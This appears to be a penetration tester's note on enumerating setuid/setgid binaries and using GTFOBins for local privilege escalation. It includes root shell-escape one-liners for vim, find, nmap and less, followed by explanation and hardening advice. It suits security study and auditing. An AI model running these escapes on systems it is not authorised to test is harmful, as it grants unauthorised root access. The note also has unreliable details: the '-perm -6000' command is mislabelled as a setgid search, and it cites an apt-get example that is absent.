Setuid/Setgid Enumeration

```bash
# Find setuid files owned by root
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find setgid files owned by root
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# Find all setuid files (regardless of owner)
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find all setgid files (regardless of owner)
find / -perm -2000 -exec ls -ldb {} \; 2>/dev/null
```

[GTFObins](https://gtfobins.github.io/) Check (Manual - Check each binary against GTFObins)

Example: If `/usr/bin/vim` has the setuid bit:
Check GTFObins for "vim"

```bash
# Example of GTFObins Usage (if vim is setuid and in GTFObins):
vim -c ':!/bin/sh'

# Example of GTFObins Usage (if nmap is setuid and in GTFObins):
nmap --interactive
!sh

# Example of GTFObins Usage (if find is setuid and in GTFObins):
find / -exec /bin/sh -p \; -quit

# Example of GTFObins Usage (if less is setuid and in GTFObins):
less /etc/passwd
!/bin/sh
```

## **Understanding setuid and setgid**

- **setuid (Set User ID):**
    - When a file has the `setuid` bit set, it executes with the effective user ID of the file's owner, not the user who runs it.
    - If the owner is root, the program runs with root privileges.
    - Represented by an "s" in the owner's execute permissions (e.g., `-rwsr-xr-x`).
    - - Command to find setuid files owned by root:
```sh
     find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
- **setgid (Set Group ID):**
    - Similar to `setuid`, but it sets the effective group ID to the file's group owner.
    - Useful for giving users temporary access to group-owned resources.
    - Represented by an "s" in the group's execute permissions (e.g. `-rwxr-sr-x`).
    - Command to find setgid files owned by root: 
```sh
    find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

### **Privilege Escalation Potential**

- If a `setuid` binary owned by root has a vulnerability, a regular user can exploit it to gain root privileges.
- Common vulnerabilities include:
    - Buffer overflows.
    - Format string vulnerabilities.
    - Unsafe use of system calls.
    - Path abuse.
- `setgid` can be used to gain the groups privileges.

## **[GTFOBins](https://gtfobins.github.io/): A Crucial Resource**

- GTFOBins (gtfobins.github.io) is a curated list of Unix binaries that can be used to bypass security restrictions in misconfigured systems.
- It provides examples of how to:
    - Escape restricted shells.
    - Escalate privileges.
    - Spawn shells.
    - Transfer files.
- The example given, using apt-get, is a very strong example of how GTFObins can be used.
- The key to using GTFObins is to enumerate the binaries that are on a target system, and then to check if those binaries have any exploits within GTFObins.

#### **Important Considerations**

- **Security Risk:** `setuid` and `setgid` can be significant security risks if not configured carefully.
- **Minimal Privileges:** Always follow the principle of least privilege. Only grant the necessary permissions.
- **Regular Audits:** Regularly audit `setuid` and `setgid` files to identify and mitigate potential risks.
- **Code Review:** If custom `setuid` or `setgid` programs are developed, conduct thorough code reviews to ensure they are secure.
- When finding a setuid or setgid binary, always check if it is within GTFObins.

**In essence, `setuid` and `setgid` are powerful tools that must be used with caution. GTFObins is an essential resource for penetration testers and security professionals to identify and exploit misconfigurations related to these permissions.**
